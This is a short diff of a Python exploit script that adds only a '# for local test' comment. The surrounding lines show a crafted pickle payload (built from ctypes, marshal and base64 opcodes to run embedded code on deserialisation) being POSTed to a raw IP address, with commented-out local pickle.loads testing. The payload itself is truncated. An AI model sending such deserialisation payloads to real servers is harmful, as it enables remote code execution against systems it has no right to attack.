@@ -23,6 +23,7 @@ data = "cos\nwrite\n(I1\nctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64de
 url = "http://136.243.194.43/"
 result = requests.post(url, data=data)
 print(result.text)
+# for local test
 # res = pickle.loads(data)
 # print('res: %r\n' % res)
 
